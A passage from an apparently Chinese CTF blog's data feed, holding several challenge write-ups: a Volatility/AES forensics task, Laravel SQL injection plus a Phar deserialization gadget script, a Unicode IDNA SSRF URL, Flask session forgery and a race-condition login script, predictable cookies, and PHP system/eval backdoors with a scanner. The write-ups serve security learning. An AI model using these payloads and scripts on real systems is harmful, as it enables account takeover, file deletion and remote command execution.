RijndaelManaged()) &#123; rijAlg.Key = byte_0; rijAlg.IV = byte_1; // Create a decryptor to perform the stream transform. ICryptoTransform decryptor = rijAlg.CreateDecryptor(rijAlg.Key, rijAlg.IV); // Create the streams used for decryption. using (MemoryStream msDecrypt = new MemoryStream(cipherText)) &#123; using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read)) &#123; using (StreamReader srDecrypt = new StreamReader(csDecrypt)) &#123; plaintext = srDecrypt.ReadToEnd(); &#125; &#125; &#125; &#125; return plaintext; &#125; &#125;&#125; 然后就拿到了我们的第二个Flag：ALLES{50m3_f0r3n51k_50m3_r3v3r51ng_4nd_50m3_c2ypt0_fun}。 那么，第三个呢？进程看了，DLL看了，下面看一下截图吧。哦吼，explorer打开了一个看似乱码的路径？我们用filescan也能找到这个路径。0x000000003e6645a0 16 0 R--r-d \\Device\\HarddiskVolume2\\Program Files\\D9f\\gCFhd\\yxEUQSFyoHU1ybvQ0S9TOOwUWFCR+HWh+YicMXXJ2hzO39bjKEbONClpsoTzUtfuC86APEJGe46byt7fmJGBEkmrtktbMIZ5Mk4LnGFkyNVkAwEKm\\O7dnFs7JKPrXrI9Co8Z4ULFf1UzT1cK5wFiIONE\\0t33K+0.bat。我们同时搜到了路径和后面的文件，先用带文件名的路径试试。然后我们注意到，Base64没有\\，但是有/，那么大胆猜测一下上述路径是个Base64：D9f/gCFhd/yxEUQSFyoHU1ybvQ0S9TOOwUWFCR+HWh+YicMXXJ2hzO39bjKEbONClpsoTzUtfuC86APEJGe46byt7fmJGBEkmrtktbMIZ5Mk4LnGFkyNVkAwEKm/O7dnFs7JKPrXrI9Co8Z4ULFf1UzT1cK5wFiIONE/0t33K+0，丢到上面的程序，看一下出什么结果。报错了，Base64不全，我们加个=，然后就得到了第三个Flag：ALLES{0n3_f0r3n51k_tr345ur3_15_ly1ng_w1th1n_th3_5h1mc4ch3}。 flag{5fd6d1a0-ac6c-4140-a6ae-64cdda65a015}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Misc","slug":"Misc","permalink":"http://tiaonmmn.github.io/tags/Misc/"},{"name":"C#","slug":"C","permalink":"http://tiaonmmn.github.io/tags/C/"},{"name":"AES","slug":"AES","permalink":"http://tiaonmmn.github.io/tags/AES/"},{"name":"Forensic","slug":"Forensic","permalink":"http://tiaonmmn.github.io/tags/Forensic/"},{"name":"Windows","slug":"Windows","permalink":"http://tiaonmmn.github.io/tags/Windows/"},{"name":"Volatility","slug":"Volatility","permalink":"http://tiaonmmn.github.io/tags/Volatility/"},{"name":"SID","slug":"SID","permalink":"http://tiaonmmn.github.io/tags/SID/"}]},{"title":"BUUOJ刷题-Web-easy_Laravel","slug":"BUUOJ刷题-Web-easy-laravel","date":"2019-09-04T03:03:27.000Z","updated":"2019-12-10T12:15:12.597Z","comments":true,"path":"2019/09/04/BUUOJ刷题-Web-easy-laravel/","link":"","permalink":"http://tiaonmmn.github.io/2019/09/04/BUUOJ%E5%88%B7%E9%A2%98-Web-easy-laravel/","excerpt":"2018 护网杯的Easy_laravel。Laravel是个PHP开发框架。 打开后网页源码提示github上有源码。但是做题的时候源码已经没了，所以我从ctftraining上拖了一份下来。 先看一下数据库。database/factories/ModelFactory.php中记录User的信息，发现用户名和email已知，但是密码是随机生成的。猜测我们要通过SQL注入登录管理员用户了。路由信息在routes/web.php中，对应的Controller在app/Http/Controllers/下对应的PHP文件。Upload和Flag只有admin用户可以访问。","text":"2018 护网杯的Easy_laravel。Laravel是个PHP开发框架。 打开后网页源码提示github上有源码。但是做题的时候源码已经没了，所以我从ctftraining上拖了一份下来。 先看一下数据库。database/factories/ModelFactory.php中记录User的信息，发现用户名和email已知，但是密码是随机生成的。猜测我们要通过SQL注入登录管理员用户了。路由信息在routes/web.php中，对应的Controller在app/Http/Controllers/下对应的PHP文件。Upload和Flag只有admin用户可以访问。 NoteController.php中代码如下： 123456public function index(Note $note)&#123; $username = Auth::user()-&gt;name; $notes = DB::select(&quot;SELECT * FROM `notes` WHERE `author`=&#x27;&#123;$username&#125;&#x27;&quot;); return view(&#x27;note&#x27;, compact(&#x27;notes&#x27;));&#125; 没有任何过滤。而在app/Http/Controllers/Auth/RegisterController.php中我们可以看到注册用户时的validator对用户名，仅做了最大字符数255的限制，没有过滤任何符号。但我们没办法直接得到admin的密码，因为被bcrypt过了。所以我们选择进行密码重置。在password_resets里当用户发出重置密码的请求时会记录下token，访问/password/reset/{token}就可以重置密码了。 我们注册test'union select 1,token,3,4,5 from password_resets where email='admin@qvq.im';，注意在config/database.php中题目是用的是SQLite数据库，不能使用#，要用;。然后打开note，就会弹出token。访问/password/reset/{token}就可以重置密码了。 登陆后点击flag，发现弹出no flag。FlagController.php里确实有读flag的操作。怎么回事？Laravel自带一套模板框架Blade。Blade模板有模板缓存机制，除非有修改，否则不会重新生成。那大胆猜测一下，这题的/flag页面模板文件被修改了，导致我们无法访问真正的页面。那下一目标就是把缓存的文件删除掉。 来看一下上传文件，允许几种图片文件的后缀，然后就将文件移动到app/public/下，问题是app/public这个目录不允许我们访问。那我们没办法上传一个webshell了。然后就想到，可不可以Phar反序列化呢？check函数中使用了file_exists()，会受Phar文件的影响，而且path和filename完全可控，看来可行。那我们的目标就是找一个会删除文件的类-&gt;构造Phar文件-&gt;上传-&gt;调用check。删除缓存模板文件，重新访问/flag即可得到flag。 我们搜索unlink，然后在vendor/swiftmailer/swiftmailer/lib/classes/Swift/ByteStream/TemporaryFileByteStream.php中发现如下代码： 123456789101112131415161718192021222324252627282930&lt;?phpclass Swift_ByteStream_TemporaryFileByteStream extends Swift_ByteStream_FileByteStream&#123; public function __construct() &#123; $filePath = tempnam(sys_get_temp_dir(), &#x27;FileByteStream&#x27;); if ($filePath === false) &#123; throw new Swift_IoException(&#x27;Failed to retrieve temporary file name.&#x27;); &#125; parent::__construct($filePath, true); &#125; public function getContent() &#123; if (($content = file_get_contents($this-&gt;getPath())) === false) &#123; throw new Swift_IoException(&#x27;Failed to get temporary file content.&#x27;); &#125; return $content; &#125; public function __destruct() &#123; if (file_exists($this-&gt;getPath())) &#123; @unlink($this-&gt;getPath()); &#125; &#125;&#125; __destruct与unlink，完全符合我们的条件。因此可以反序列化这个了。getPath()函数需要的参数是_path，将其指向我们需要的文件名即可。下一步是缓存的文件名是什么？ 网上似乎没太多资料，那我们翻代码好了。vendor/laravel/framework/src/Illuminate/View/Compilers/BladeCompiler.php中有一段代码： 123456789101112public function compile($path = null)&#123; if ($path) &#123; $this-&gt;setPath($path); &#125; if (! is_null($this-&gt;cachePath)) &#123; $contents = $this-&gt;compileString($this-&gt;files-&gt;get($this-&gt;getPath())); $this-&gt;files-&gt;put($this-&gt;getCompiledPath($this-&gt;getPath()), $contents); &#125;&#125;而getCompiledPath代码为： 1234public function getCompiledPath($path)&#123; return $this-&gt;cachePath . &#x27;/&#x27; . sha1($path) . &#x27;.php&#x27;;&#125; 看来我们可以计算模板的缓存文件名了。需要注意的是，这里的\\(path用的是绝对路径。我们登录管理员账户以后note有一条提示我们用的是Apache默认配置。那么文件路径就在/var/www/html/下了。这里\\)path应该是/var/www/html/resources/views/auth/flag.blade.php。sha1为73eb5933be1eb2293500f4a74b45284fd453f0bb。 所以payload为：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091&lt;?phpclass Swift_ByteStream_AbstractFilterableInputStream &#123; /** * Write sequence. */ protected $sequence = 0; /** * StreamFilters. * * @var Swift_StreamFilter[] */ private $filters = []; /** * A buffer for writing. */ private $writeBuffer = &#x27;&#x27;; /** * Bound streams. * * @var Swift_InputByteStream[] */ private $mirrors = [];&#125;class Swift_ByteStream_FileByteStream extends Swift_ByteStream_AbstractFilterableInputStream &#123; /** The internal pointer offset */ private $_offset = 0; /** The path to the file */ private $_path; /** The mode this file is opened in for writing */ private $_mode; /** A lazy-loaded resource handle for reading the file */ private $_reader; /** A lazy-loaded resource handle for writing the file */ private $_writer; /** If magic_quotes_runtime is on, this will be true */ private $_quotes = false; /** If stream is seekable true/false, or null if not known */ private $_seekable = null; /** * Create a new FileByteStream for $path. * * @param string $path * @param bool $writable if true */ public function __construct($path, $writable = false) &#123; $this-&gt;_path = $path; $this-&gt;_mode = $writable ? &#x27;w+b&#x27; : &#x27;rb&#x27;; if (function_exists(&#x27;get_magic_quotes_runtime&#x27;) &amp;&amp; @get_magic_quotes_runtime() == 1) &#123; $this-&gt;_quotes = true; &#125; &#125; /** * Get the complete path to the file. * * @return string */ public function getPath() &#123; return $this-&gt;_path; &#125;&#125;class Swift_ByteStream_TemporaryFileByteStream extends Swift_ByteStream_FileByteStream &#123; public function __construct() &#123; $filePath = &quot;/var/www/html/storage/framework/views/34e41df0934a75437873264cd28e2d835bc38772.php&quot;; parent::__construct($filePath, true); &#125; public function __destruct() &#123; if (file_exists($this-&gt;getPath())) &#123; @unlink($this-&gt;getPath()); &#125; &#125;&#125;$obj = new Swift_ByteStream_TemporaryFileByteStream();$p = new Phar(&#x27;./1.phar&#x27;, 0);$p-&gt;startBuffering();$p-&gt;setStub(&#x27;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#x27;);$p-&gt;setMetadata($obj);$p-&gt;addFromString(&#x27;1.txt&#x27;,&#x27;text&#x27;);$p-&gt;stopBuffering();rename(&#x27;./1.phar&#x27;, &#x27;1.gif&#x27;);?&gt; 上传以后check该文件，需要注意的是要添加path参数为\"phar:///var/www/html/storage/app/public/1.gif\"，提交以后模板文件就会被删除，我们访问/flag就会出现刷新以后的页面，即flag了。 flag{5e9a2127-047a-45f6-9772-6637a444fd8f}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Unserialize","slug":"Unserialize","permalink":"http://tiaonmmn.github.io/tags/Unserialize/"},{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"},{"name":"Phar","slug":"Phar","permalink":"http://tiaonmmn.github.io/tags/Phar/"},{"name":"Laravel","slug":"Laravel","permalink":"http://tiaonmmn.github.io/tags/Laravel/"},{"name":"Blade","slug":"Blade","permalink":"http://tiaonmmn.github.io/tags/Blade/"}]},{"title":"BUUOJ刷题-Web-Pythonginx","slug":"BUUOJ刷题-Web-Pythonginx","date":"2019-09-03T10:44:44.000Z","updated":"2020-09-01T13:14:10.715Z","comments":true,"path":"2019/09/03/BUUOJ刷题-Web-Pythonginx/","link":"","permalink":"http://tiaonmmn.github.io/2019/09/03/BUUOJ%E5%88%B7%E9%A2%98-Web-Pythonginx/","excerpt":"SUCTF 2019的Pythonginx。 打开页面就给了源码。要求提交的URL里经过parse.urlparse的处理，hostname为suctf.cc，urlsplit处理后第二部分返回的也是suctf.cc，然后按.分割，idna编码再解码成UTF-8后再组合，要求urlparse的hostname还是suctf.cc，那么就会进行SSRF。","text":"SUCTF 2019的Pythonginx。 打开页面就给了源码。要求提交的URL里经过parse.urlparse的处理，hostname为suctf.cc，urlsplit处理后第二部分返回的也是suctf.cc，然后按.分割，idna编码再解码成UTF-8后再组合，要求urlparse的hostname还是suctf.cc，那么就会进行SSRF。 这道题涉及到一个最近的议题这个和这个。简单来说，就是URL包含Unicode字符时会转成Punycode，转换的时候会对Unicode字符额外编码(IDNA)，但有的Unicode字符转IDNA的时候已经解释成正常ASCII字符了，Punycode就不会进行。上述的Unicode字符中有些包含/，就会对网址的含义造成影响。如\"℀\"(U+2100)，转换的时候就变成了a/c，造成URL的切割。www.f℀ke.microsoft.com，就会变成www.fa/cke.microsoft.com，域名发生变化。 PPT的第36页就是题目中的代码。因此我们如法炮制，构造一个特殊URL造成/的出现。我们的目标是file://suctf.cc/?，最后一个c后出现/和一个我们想要的字符。那么我们来遍历一下U你code字符集吧。 1234import unicodedatafor i in range(0x0000,0xffff): if &quot;/&quot; in unicodedata.normalize(&quot;NFKC&quot;,chr(i)): print(i,chr(i)) 出乎意料的，返回的结果并不多。 12345647 &#x2F;8448 ℀8449 ℁8453 ℅8454 ℆65295 ／ 而其中8453和8454的结果是我们想要的。那么下一步是我们读什么文件？注意到本题用的Web服务器是Openresty，Lua+Nginx，那么我们猜一下读nginx的配置文件吧。 http://233bff3e-839d-4464-a0c6-6e36ee1325d3.node1.buuoj.cn/getUrl?url=file%3A%2F%2Fsuctf.c%E2%84%86sr%2Flocal%2Fnginx%2Fconf%2Fnginx.conf 返回server &#123; listen 80; location / &#123; try_files $uri @app; &#125; location @app &#123; include uwsgi_params; uwsgi_pass unix:///tmp/uwsgi.sock; &#125; location /static &#123; alias /app/static; &#125; # location /flag &#123; # alias /usr/fffffflag; # &#125; &#125; 那么直接读/usr/fffffflag就好了。 上面的Unicode字符查找方式是完全按照Paper来的。其实我们可以放开限制，只要suctf.cc的最后一个c在IDNA编码后是ASCII c即可。 1234567891011121314151617181920212223242526272829303132333435from urllib.parse import urlparse,urlunsplit,urlsplitfrom urllib import parsedef get_unicode(): for x in range(65536): uni=chr(x) url=&quot;http://suctf.c&#123;&#125;&quot;.format(uni) try: if getUrl(url): print(&quot;str: &quot;+uni+&#x27; unicode: \\\\u&#x27;+str(hex(x))[2:]) except: passdef getUrl(url): url = url host = parse.urlparse(url).hostname if host == &#x27;suctf.cc&#x27;: return False parts = list(urlsplit(url)) host = parts[1] if host == &#x27;suctf.cc&#x27;: return False newhost = [] for h in host.split(&#x27;.&#x27;): newhost.append(h.encode(&#x27;idna&#x27;).decode(&#x27;utf-8&#x27;)) parts[1] = &#x27;.&#x27;.join(newhost) finalUrl = urlunsplit(parts).split(&#x27; &#x27;)[0] host = parse.urlparse(finalUrl).hostname if host == &#x27;suctf.cc&#x27;: return True else: return Falseif __name__==&quot;__main__&quot;: get_unicode() 同样可以找到合适的Unicode字符。 flag{82faae26-4da6-4cf1-b8fc-37dfdd7790f04}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"},{"name":"Python","slug":"Python","permalink":"http://tiaonmmn.github.io/tags/Python/"},{"name":"Unicode","slug":"Unicode","permalink":"http://tiaonmmn.github.io/tags/Unicode/"}]},{"title":"BUUOJ刷题-Web-admin","slug":"BUUOJ刷题-Web-admin","date":"2019-09-02T06:58:02.000Z","updated":"2019-12-10T12:15:12.589Z","comments":true,"path":"2019/09/02/BUUOJ刷题-Web-admin/","link":"","permalink":"http://tiaonmmn.github.io/2019/09/02/BUUOJ%E5%88%B7%E9%A2%98-Web-admin/","excerpt":"HCTF 2018的admin。 上来让我们注册，同时网页注释提示you are not admin.看来得先拿到admin权限才行。登录后在change_password处发现源代码提示https://github.com/woadsl1234/hctf_flask/，下载看看。 Flask程序，路由在routes.py中，/edit是个假功能，用的SQLAlchemy，没发现什么SQL注入点。在templates.html中有一句{% if current_user.is_authenticated and session['name'] == 'admin' %}，session['name']为admin时显示flag。","text":"HCTF 2018的admin。 上来让我们注册，同时网页注释提示you are not admin.看来得先拿到admin权限才行。登录后在change_password处发现源代码提示https://github.com/woadsl1234/hctf_flask/，下载看看。 Flask程序，路由在routes.py中，/edit是个假功能，用的SQLAlchemy，没发现什么SQL注入点。在templates.html中有一句{% if current_user.is_authenticated and session['name'] == 'admin' %}，session['name']为admin时显示flag。 # Session欺骗 既然用的Flask，而且看一遍源码，没有对Session进行什么奇怪操作，那么就可以对页面传递过来的Session进行decode。参考这个，照抄脚本解密cookie。 123456789101112131415161718192021222324252627282930313233#!/usr/bin/env python3import sysimport zlibfrom base64 import b64decodefrom flask.sessions import session_json_serializerfrom itsdangerous import base64_decodedef decryption(payload): payload, sig = payload.rsplit(&#x27;.&#x27;, 1) payload, timestamp = payload.rsplit(&#x27;.&#x27;, 1) decompress = False if payload.startswith(&#x27;.&#x27;): payload = payload[1:] decompress = True try: payload = base64_decode(payload) except Exception as e: raise Exception(&#x27;Could not base64 decode the payload because of &#x27; &#x27;an exception&#x27;) if decompress: try: payload = zlib.decompress(payload) except Exception as e: raise Exception(&#x27;Could not zlib decompress the payload before &#x27; &#x27;decoding the payload&#x27;) return session_json_serializer.loads(payload)if __name__ == &#x27;__main__&#x27;: print(decryption(sys.argv[1].encode())) 或者这个 1234567891011121314151617181920import base64import zlibEXAMPLE_SESSION = &quot;.eJw9kMGOgkAMhl9l07MHVvBC4sEEJJB0JpjiZOZiVFCYATcBjDDGd99ZN_HSy9d-7d8nHC59NdQQjv29WsChKSF8wtcJQmCdtGhTH2kzS7vxpJBLFmUtUmaUKFYYFRMn9NB1KcpnZuMZrQlQKKMS-eAJrjDZaTdlkIzPKPWlzS0mW4P6_FB0nVSybzmVjRL5JG3WYOR4VwRMpzM6h6RNwCm3SuxqHhWBpFK7Xb6iYokiaxXVNSbpGl4LOA_95TD-mOr2iSDp7KGIH6pLJ2ZdHGpbV2cu9hqj2Ps7G_XecCEnFm1d4LJm1_Vb13THa_Ux5br2Kf8nt2PnAIzVMMIC7kPVv98G3x68fgHcO26J.XWzFXA.9Z-Tu9gpzsrd4sNdUecbrNh0rvo&quot;def decodeCookiePayload(): if EXAMPLE_SESSION[0] == &#x27;.&#x27;: session_payload = EXAMPLE_SESSION[1:].split(&#x27;.&#x27;)[0] print(&quot;Extracted Session datas : &#123;&#125;&quot;.format(session_payload)) decoded_session_payload = base64.urlsafe_b64decode(session_payload) decompressed_session_payload = zlib.decompress(decoded_session_payload) print(&quot;Extracted decoded uncompressed datas : &#123;&#125; &quot;.format(decompressed_session_payload))if __name__ == &#x27;__main__&#x27;: print(&quot;Flask Cookie Session Datas Decoder&quot;) decodeCookiePayload() 解出来这个东西：&#123;u'csrf_token': 'a741a0fb176319ec329ec014e4225d9f141fc7a6', u'user_id': u'10', u'name': u'test', u'image': 'B8wM', u'_fresh': True, u'_id': '6f3327102c04af642e12dee9051934333e427123981fddf08c90dcccd197527c430ad270e81dee97bed1c2b0432e86220f0a08943eda858a7ce47e561bee8a0b'&#125;。我们看到了name，很容易想到把name改成admin。 到github上找到了这个。他要求我们找到SECRET_KEY。在config.py中确实有SECRET_KEY的出现，我们尝试一下ckj123。注意，在源码中我们看不出来是否是Python3，所以两个版本都试一下。注意要把Unicode说明符去掉。用Python3版本替换Cookie后访问index成功得到flag。 Unicode欺骗 在routes.py有关/change的代码中，有一行很奇怪。name=strlower(session['name'])，同样的，在注册的时候也要求name被strlower()处理过。而strlower不是Python自带函数，这个函数来源于twisted.words.protocols.jabber.xmpp_stringprep的nodeprep，那么我们去找一下twisted的文档。注意到一个问题，twisted的版本现在为19.2.0，而题目中要求使用10.2.0，估计问题就出在这里。10.2.0版本的源码在这里，在nodeprep上和最新版本的没有太大差别。那么我们再去找找，Google \"twisted nodeprep\"，在reddit上找到了这个。简单来讲，Unicode字符有一类拉丁文小字符，nodeprep会将其转成大写。如ᴬ(U+1D2C)，调用nodeprep.prepare()后会变成A，再次调用会变成a。 那么攻击步骤就很明确了：注册一个ᴬdmin用户，登录会变成Admin，然后去修改密码，这时修改的实际上是admin用户的密码。我们就可以直接登录了。 条件竞争 在源码app/routes.py中login()和change()都可以看到这几行： 1234if request.method == &#x27;POST&#x27;: name = strlower(form.username.data) session[&#x27;name&#x27;] = name user = User.query.filter_by(username=name).first() session['name']是先赋的值，后进行数据库查询。因此如果我们先正常登陆得到session，然后用刚才的session再次登录使得session['name']='admin'，然后再change_password就可以改掉密码了。但是正常手段是肯定不行的，正常登录后访问/login直接跳转，我们需要某种方法使得用户成功登陆后取消掉current_user.is_authenticated。我们可以同时开启两个登录进程，一个在登陆后改密码，运行到name=strlower(session['name'])的时候，另一个进程进行logout操作，并尝试以admin用户名登录。session['name']就会变成admin。 1234567891011121314151617181920212223242526272829303132333435363738394041424344import sysimport threadingimport timeimport requestsurl = &quot;http://706ef821-ae29-46f1-9027-2d7189c508a0.node3.buuoj.cn/&quot;def login(s: requests.sessions.Session, username, password): data = &#123;&quot;username&quot;: username, &quot;password&quot;: password, &#x27;submit&#x27;: &quot;&quot;&#125; return s.post(url=url + &quot;login&quot;, data=data)def logout(s: requests.sessions.Session): return s.post(url=url + &quot;logout&quot;)def change(s: requests.sessions.Session, newpass): data = &#123;&quot;newpassword&quot;: newpass&#125; return s.post(url=url, data=data)def func1(s: requests.sessions.Session): login(s,&#x27;tiaonmmn&#x27;, &#x27;tiaonmmn&#x27;) change(s, &#x27;tiaonmmn&#x27;)def func2(s: requests.sessions.Session): logout(s) result = login(s,&#x27;admin&#x27;, &#x27;admin&#x27;) print(result.text) if &quot;Invalid&quot; not in result.text: print(result.cookies) sys.exit(0)if __name__ == &quot;__main__&quot;: for i in range(1000): print(&quot;[+] Round &#123;0&#125;&quot;.format(i)) s = requests.Session() t1 = threading.Thread(target=func1, args=(s,)) t2 = threading.Thread(target=func2, args=(s,)) t1.start() t2.start() time.sleep(0.5) 或者，有另外一种骚操作：源码里给出了Dockerfile，可以知道本题每30分钟清理一次数据库。所以，我们完全可以先注册一个用户，然后登陆，等30分钟后尝试登录admin，再注册相同用户名的账号就会直接得到admin身份。 注册用户后得到一个user_id，30分钟后user_id不存在，数据库查询会失败，我们以admin登录，session['name']='admin'，再次注册后user_id合法，而此时session['name']已经是admin了，直接拿到admin权限。 flag{ae5d2ccc-ec38-4d66-ad72-f50aa54d43ba}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"},{"name":"Session","slug":"Session","permalink":"http://tiaonmmn.github.io/tags/Session/"},{"name":"Python","slug":"Python","permalink":"http://tiaonmmn.github.io/tags/Python/"},{"name":"Flask","slug":"Flask","permalink":"http://tiaonmmn.github.io/tags/Flask/"}]},{"title":"RuCTF2019-beacons","slug":"RuCTF2019-beacons","date":"2019-09-01T13:07:21.000Z","updated":"2019-12-10T12:15:12.674Z","comments":true,"path":"2019/09/01/RuCTF2019-beacons/","link":"","permalink":"http://tiaonmmn.github.io/2019/09/01/RuCTF2019-beacons/","excerpt":"RuCTF 2019 Final是一个线上AWD比赛。今天看一下其中的beacons题。RuCTF的flag不会保存在文件中，基本都在数据库中。 Python 3.6 Sanic框架+MongoDB。Sanic框架跟flask的语法其实感觉有点像，也是一个MVC框架，controllers的代码在controllers目录下。我打AWD喜欢黑白盒同时用。本题的flag保存在随机用户中的某个beacon信息中。","text":"RuCTF 2019 Final是一个线上AWD比赛。今天看一下其中的beacons题。RuCTF的flag不会保存在文件中，基本都在数据库中。 Python 3.6 Sanic框架+MongoDB。Sanic框架跟flask的语法其实感觉有点像，也是一个MVC框架，controllers的代码在controllers目录下。我打AWD喜欢黑白盒同时用。本题的flag保存在随机用户中的某个beacon信息中。 打开就让你登录或者注册。我们先看login.py吧。login的时候用户名和密码不能超40个字符。注册同理，用户名和密码只允许出现[A-Za-z0-9_]这些字符，注册的时候会写入用户名(name)、密码(password)、beacons和一个invites，invites是通过get_invites()函数生成的，大致上就是随机生成200个随机UUID字符串。 controllers其余的函数所要求的@auth.login_required注解来源于sessions.py。这里表明，该程序使用名为session的Cookie用于表示身份。注意下列代码： 1234def _cookie_gen(self, cookie=&#x27;&#x27;): while True: cookie = hashlib.md5(cookie.encode()).hexdigest() yield cookie cookie生成方式为对上一cookie进行md5 hash，最初的cookie为空。这就是此题的漏洞点一：cookie完全可预测。实测www.cmd5.com等网站对于md5(md5())加密支持良好，因此我们完全可以通过对现有cookie进行解密，得到上一登录用户的cookie，进而冒充登录。然后我们就可以得到相应的beacon信息。 回到正常流程来。在登陆后进入主页面。这部分在controllers下的map.py中。渲染map.html，接受用户对地图的点击参数，通过center_x和center_y接受X和Y值。然后get_beacons()函数查询(center_x,center_y)所指位置是否有beacon。 在beacon.py中，我们可以添加beacon，要求name不大于25个字符，且只能出现[A-Za-z0-9_]中的字符，comment不大于255个字符，且只能出现[A-Za-z0-9_!?.,=']中的字符。每个用户只能创建至多200个beacon，坐标不能重复。用户发布private的beacon后可以通过invites共享给其他用户。invites从创建用户时的invites取值。而创建public的beacon时是全网站用户都可以看到的。创建beacon后可以上传照片。上传的照片通过content-type获取，为image/jpg,image/jpeg,image/tiff这三种之一。而访问/Beacon/GetUserBeacons可以获得当前用户的beacon信息，访问/Beacon/&lt;beaconid&gt;可以获取单独beacon的信息。 photo_controller.py中，我们可以访问/Photo/GetLatest获得最近public的beacon的照片，/Photo/GetPhoto/&lt;photoid&gt;获取photo的信息。 flag{9cdcdbbf-1c2b-40da-92d9-042d777cbf5e}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://tiaonmmn.github.io/tags/Python/"},{"name":"RuCTF","slug":"RuCTF","permalink":"http://tiaonmmn.github.io/tags/RuCTF/"},{"name":"Sanic","slug":"Sanic","permalink":"http://tiaonmmn.github.io/tags/Sanic/"},{"name":"MongoDB","slug":"MongoDB","permalink":"http://tiaonmmn.github.io/tags/MongoDB/"}]},{"title":"BUUOJ刷题-Web-高明的黑客","slug":"BUUOJ刷题-Web-高明的黑客","date":"2019-08-30T09:45:28.000Z","updated":"2019-12-10T12:15:12.605Z","comments":true,"path":"2019/08/30/BUUOJ刷题-Web-高明的黑客/","link":"","permalink":"http://tiaonmmn.github.io/2019/08/30/BUUOJ%E5%88%B7%E9%A2%98-Web-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/","excerpt":"2019强网杯高明的黑客。 打开页面，写得很明白。www.tar.gz下载后发现有3001个PHP文件。每个PHP文件都有类似的代码段，看起来像是个自动代码生成的产物。 结构有如下几种：","text":"2019强网杯高明的黑客。 打开页面，写得很明白。www.tar.gz下载后发现有3001个PHP文件。每个PHP文件都有类似的代码段，看起来像是个自动代码生成的产物。 结构有如下几种： 12345$_GET[&#x27;jVMcNhK_F&#x27;] = &#x27; &#x27;;system($_GET[&#x27;jVMcNhK_F&#x27;] ?? &#x27; &#x27;); 12345$_GET[&#x27;tz2aE_IWb&#x27;] = &#x27; &#x27;;echo \\`&#123;$_GET[&#x27;tz2aE_IWb&#x27;]&#125;\\`; 12345$_GET[&#x27;cXjHClMPs&#x27;] = &#x27; &#x27;;echo \\`&#123;$_GET[&#x27;cXjHClMPs&#x27;]&#125;\\`; 1234567891011121314151617function ZwXq7h4()&#123; $kg = &#x27;eTgcwk&#x27;; $tWpHGUieX = &#x27;BL02r6&#x27;; $eGPiYwW9IX3 = &#x27;d0agCqWE&#x27;; $YRGLSyUMNnN = new stdClass(); $YRGLSyUMNnN-&gt;IfsR = &#x27;tpt7Y_H&#x27;; $YRGLSyUMNnN-&gt;aLX6ZxLYjJ = &#x27;QlHS60c&#x27;; $kg = $_POST[&#x27;i84HFoocE21gs&#x27;] ?? &#x27; &#x27;; $tWpHGUieX = explode(&#x27;Q7iPB9MuttH&#x27;, $tWpHGUieX); if(&#x27;cg6BNgitU&#x27; == &#x27;RGcyY1oQX&#x27;) system($_GET[&#x27;cg6BNgitU&#x27;] ?? &#x27; &#x27;); $_GET[&#x27;ganVMUq3d&#x27;] = &#x27; &#x27;; eval($_GET[&#x27;ganVMUq3d&#x27;] ?? &#x27; &#x27;); &#125;ZwXq7h4(); 12345$wr2t = &#x27;Qhh4_apLRLY&#x27;;$wr2t = $_POST[&#x27;K3Udo9aauO&#x27;] ?? &#x27; &#x27;; 整体来讲，代码类似于命令执行的后门，但是都被提前置空了，因而无法触发。猜测某个文件下有参数没有置空，因此能够执行命令。那么我们的思路就是暴力扫描所有的GET和POST参数，测试命令为'echo qwertyuiop'，如果在返回页面中出现了这个字符串，那么就意味着命令执行成功了。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586import multiprocessingimport osimport reimport requestsurl = &quot;http://127.0.0.1/src/&quot;counts = 0def process(url, file, method, parameter): if method == &quot;get&quot;: a = requests.get(&quot;&#123;0&#125;/&#123;1&#125;?&#123;2&#125;=echo &#x27;qwertyuiop&#x27;&quot;.format(url, file, parameter)) if &quot;qwertyuiop&quot; in a.text: print(&quot;[!]Found parameter in &#123;0&#125;.Method is &#123;1&#125;.Parameter is &#123;2&#125;.&quot;.format(file, method, parameter)) exit() if method == &quot;post&quot;: data = dict() data[parameter] = &quot;echo &#x27;qwertyuiop&#x27;&quot; a = requests.post(&quot;&#123;0&#125;/&#123;1&#125;&quot;.format(url, file), data=data) if &quot;qwertyuiop&quot; in a.text: print(&quot;[!]Found parameter in &#123;0&#125;.Method is &#123;1&#125;.Parameter is &#123;2&#125;.&quot;.format(file, method, parameter)) exit()def read_file(single_file): global counts counts += 1 print(&quot;[+]Processing file:&#123;0&#125;&quot;.format(single_file)) lines = open(single_file).readlines() get_pattern = r&quot;\\$_GET\\[\\S+\\]&quot; post_pattern = r&quot;\\$_POST\\[\\S+\\]&quot; for line in lines: get_obj = re.search(get_pattern, line) post_obj = re.search(post_pattern, line) if get_obj: print(&quot;[+]Found get parameter:&#123;0&#125;&quot;.format(get_obj.group())) parameter = get_obj.group()[7:-2] process(url=url, method=&quot;get&quot;, parameter=parameter, file=single_file) if post_obj: print(&quot;[+]Found post 